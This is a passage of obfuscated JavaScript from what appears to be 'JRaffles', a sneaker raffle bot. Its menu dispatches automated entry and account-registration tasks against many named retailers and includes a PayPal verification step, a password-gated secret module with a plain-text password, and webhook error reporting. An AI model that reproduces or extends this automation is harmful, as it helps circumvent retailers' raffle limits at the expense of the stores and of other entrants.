                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x241653['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x241653['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x241653['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x241653['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2ed3f8();
                if (taskModule > _0x241653['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xfa5357(0x3e8), _0x15516c();
                if (_0x241653[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                    var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x5f19a0 = await _0xf9bb70();
                            await _0x239b8d['function'](_0x239b8d, _0x5f19a0);
                        }
                        if (taskFunction == 0x2) {
                            var _0x5f19a0 = await _0xf9bb70(), _0x10bb88 = await _0x333b4a(_0x239b8d);
                            _0x50b722['shuffleTasks'] && await _0x56de24(_0x10bb88), await _0x239b8d['function'](_0x239b8d, _0x10bb88, _0x5f19a0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5f19a0 = await _0xf9bb70(), _0x10bb88 = await _0x333b4a(_0x239b8d);
                                _0x50b722['shuffleTasks'] && await _0x56de24(_0x10bb88), await _0x239b8d['function'](_0x239b8d, _0x10bb88, _0x5f19a0);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x5f19a0 = await _0xf9bb70();
                                    await _0x239b8d['function'](_0x239b8d, _0x5f19a0);
                                }
                            }
                        }
                    } catch (_0x59dbaa) {
                        console['log'](_0x59dbaa), await _0xfa5357(0x7d0);
                    }
                    return _0x15516c();
                }
                if (_0x241653[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                        var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5f19a0 = await _0xf9bb70(), _0x4847cd = await _0x333b4a(_0x239b8d);
                            _0x50b722['shuffleTasks'] && await _0x56de24(_0x4847cd), await _0x239b8d['function'](_0x239b8d, _0x4847cd, _0x5f19a0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5f19a0 = await _0xf9bb70(), _0x4847cd = await _0x333b4a(_0x239b8d);
                                _0x50b722['shuffleTasks'] && await _0x56de24(_0x4847cd), await _0x239b8d['function'](_0x239b8d, _0x4847cd, _0x5f19a0);
                            }
                        }
                    } catch (_0x1d337) {
                        console['log'](_0x1d337), await _0xfa5357(0xfa0);
                    }
                    return _0x15516c();
                }
                if (_0x241653[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                        var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5f19a0 = await _0xf9bb70(), _0x4847cd = await _0x333b4a(_0x239b8d);
                            _0x50b722['shuffleTasks'] && await _0x56de24(_0x4847cd), await _0x239b8d['function'](_0x239b8d, _0x4847cd, _0x5f19a0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5f19a0 = await _0xf9bb70(), _0x4847cd = await _0x333b4a(_0x239b8d);
                                _0x50b722['shuffleTasks'] && await _0x56de24(_0x4847cd), await _0x239b8d['function'](_0x239b8d, _0x4847cd, _0x5f19a0);
                            }
                        }
                    } catch (_0x51a253) {
                        console['log'](_0x51a253), await _0xfa5357(0xfa0);
                    }
                    return _0x15516c();
                }
                if (_0x241653[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                    var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x5f19a0 = await _0xf9bb70();
                        return await _0x239b8d['function'](_0x239b8d, _0x5f19a0), _0x15516c();
                    }
                    var _0x5f19a0 = await _0xf9bb70(), _0x52f80d = await _0x333b4a(_0x239b8d);
                    return _0x50b722['shuffleTasks'] && await _0x56de24(_0x52f80d), await _0x239b8d['function'](_0x239b8d, _0x52f80d, _0x5f19a0), _0x15516c();
                }
                if (_0x241653[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                    var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5f19a0 = await _0xf9bb70(), _0x52f80d = await _0x333b4a(_0x239b8d);
                    return _0x50b722['shuffleTasks'] && await _0x56de24(_0x52f80d), await _0x239b8d['function'](_0x239b8d, _0x52f80d, _0x5f19a0), _0x15516c();
                }
                if (_0x241653[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                    var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5f19a0 = await _0xf9bb70(), _0x52f80d = await _0x333b4a(_0x239b8d);
                    return _0x50b722['shuffleTasks'] && await _0x56de24(_0x52f80d), await _0x239b8d['function'](_0x239b8d, _0x52f80d, _0x5f19a0), _0x15516c();
                }
                if (_0x241653[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                    var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5f19a0 = await _0xf9bb70(), _0x52f80d = await _0x333b4a(_0x239b8d);
                    return _0x50b722['shuffleTasks'] && await _0x56de24(_0x52f80d), await _0x239b8d['function'](_0x239b8d, _0x52f80d, _0x5f19a0), _0x15516c();
                } else {
                    if (_0x241653[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                        var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x5f19a0 = await _0xf9bb70(), _0xcf8c43 = await _0x333b4a(_0x239b8d);
                            return _0x50b722['shuffleTasks'] && await _0x56de24(_0xcf8c43), await _0x239b8d['function'](_0x239b8d, _0xcf8c43, _0x5f19a0), _0x15516c();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5f19a0 = await _0xf9bb70();
                                return await _0x239b8d['function'](_0x239b8d, null, _0x5f19a0), _0x15516c();
                            }
                        }
                        ;
                    } else {
                        if (_0x241653[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                            var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction], _0x5f19a0 = await _0xf9bb70(), _0x13d37f = await _0x333b4a(_0x239b8d);
                            return _0x50b722['shuffleTasks'] && await _0x56de24(_0x13d37f), await _0x239b8d['function'](_0x239b8d, _0x13d37f, _0x5f19a0), await _0xfa5357(0x1388), _0x15516c();
                        } else {
                            if (_0x241653[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                                var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x5f19a0 = await _0xf9bb70(), _0xcf8c43 = await _0x333b4a(_0x239b8d);
                                    return _0x50b722['shuffleTasks'] && await _0x56de24(_0xcf8c43), await _0x239b8d['function'](_0x239b8d, _0xcf8c43, _0x5f19a0), _0x15516c();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x5f19a0 = await _0xf9bb70();
                                        return await _0x239b8d['function'](_0x239b8d, null, _0x5f19a0), _0x15516c();
                                    }
                                }
                                ;
                            } else {
                                if (_0x241653[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                                    var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x239b8d);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x241653[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                                        var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x5f19a0 = await _0xf9bb70(), _0x55e697 = await _0x333b4a(_0x239b8d);
                                            return _0x50b722['shuffleTasks'] && await _0x56de24(_0x55e697), await _0x239b8d['function'](_0x239b8d, _0x55e697, _0x5f19a0), _0x15516c();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x5f19a0 = await _0xf9bb70(), _0x55e697 = await _0x333b4a(_0x239b8d);
                                                return _0x50b722['shuffleTasks'] && await _0x56de24(_0x55e697), await _0x239b8d['function'](_0x239b8d, _0x55e697, _0x5f19a0), _0x15516c();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x241653[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                                            var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5f19a0 = await _0xf9bb70(), _0x1e1f91 = await _0x333b4a(_0x239b8d);
                                                return _0x50b722['shuffleTasks'] && await _0x56de24(_0x1e1f91), await _0x239b8d['function'](_0x239b8d, _0x1e1f91, _0x5f19a0), _0x15516c();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5f19a0 = await _0xf9bb70(), _0x1e1f91 = await _0x333b4a(_0x239b8d);
                                                    return _0x50b722['shuffleTasks'] && await _0x56de24(_0x1e1f91), await _0x239b8d['function'](_0x239b8d, _0x1e1f91, _0x5f19a0), _0x15516c();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x241653[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                                                var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5f19a0 = await _0xf9bb70(), _0x5ed952 = await _0x333b4a(_0x239b8d);
                                                    return _0x50b722['shuffleTasks'] && await _0x56de24(_0x5ed952), await _0x239b8d['function'](_0x239b8d, _0x5ed952, _0x5f19a0), _0x15516c();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5f19a0 = await _0xf9bb70(), _0x5ed952 = await _0x333b4a(_0x239b8d);
                                                        return _0x50b722['shuffleTasks'] && await _0x56de24(_0x5ed952), await _0x239b8d['function'](_0x239b8d, _0x5ed952, _0x5f19a0), _0x15516c();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x241653[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                                                    var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5f19a0 = await _0xf9bb70(), _0x9cdfd2 = await _0x333b4a(_0x239b8d);
                                                        return _0x50b722['shuffleTasks'] && await _0x56de24(_0x9cdfd2), await _0x239b8d['function'](_0x239b8d, _0x9cdfd2, _0x5f19a0), _0x15516c();
                                                    }
                                                } else {
                                                    if (_0x241653[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0xfa5357(0x3e8), _0x15516c();
                                                    else {
                                                        if (_0x241653[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x202b0a = _0x241653[taskModule]['name'], _0x5f19a0 = await _0xf9bb70();
                                                            return await _0x2f2518(_0x202b0a, _0x5f19a0), _0x15516c();
                                                        } else {
                                                            if (_0x241653[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x2cb1d6(_0x241653[taskModule]['modules']);
                                                                var _0x239b8d = _0x241653[taskModule]['modules'][taskFunction];
                                                                return await _0x239b8d['function'](_0x239b8d), _0x15516c();
                                                            } else {
                                                                if (_0x241653[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x3de78b = 0x0;
                                                                    for (const _0x5a6105 in _0x50b722) {
                                                                        console['log']('(' + _0x3de78b + ')\x20' + _0x5a6105 + '\x20:\x20' + _0x50b722[_0x5a6105]), _0x3de78b++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x3de78b + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x2aac17 = await _0x499691();
                                                                    if (_0x2aac17 == _0x3de78b)
                                                                        return _0x15516c();
                                                                    console['clear'];
                                                                    var _0x3a7a16 = 0x0;
                                                                    for (var _0x9049f7 in _0x50b722) {
                                                                        if (_0x2aac17 == _0x3a7a16) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x9049f7 + '\x20:'), _0x50b722[_0x9049f7] = await _0xfb743e(), _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722));
                                                                            break;
                                                                        } else
                                                                            _0x3a7a16++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0xfa5357(0xbb8), _0x15516c();
                                                                } else {
                                                                    if (_0x241653[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0xca6926(), _0x15516c();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x241653[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x13d33a = await _0x69c930();
                                                                            _0x13d33a == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x3b93b0(), await afewFunction(_0x2c361a[_0x1c2184], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xfa5357(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x15516c();
            } catch (_0x19351f) {
                return console['log'](_0x19351f), _0x15516c();
            }
        } catch (_0x3bb03e) {
            return console['log'](_0x3bb03e), await _0xfa5357(0x3a98);
        }
}
;
_0x3b7620('JRaffles\x20' + _0x1f5435), _0xca6926();
try {
    _0x58be10();
} catch (_0x80aa72) {
    var _0x1bee89 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x4ee077
            },
            {
                'name': 'Version',
                'value': '' + _0x1f5435
            },
            {
                'name': 'Error',
                'value': '' + _0x80aa72
            }
        ]
    }];
    const _0xee1448 = { 'embeds': _0x1bee89 };
    _0x33437b(_0x5e1645, _0xee1448);
}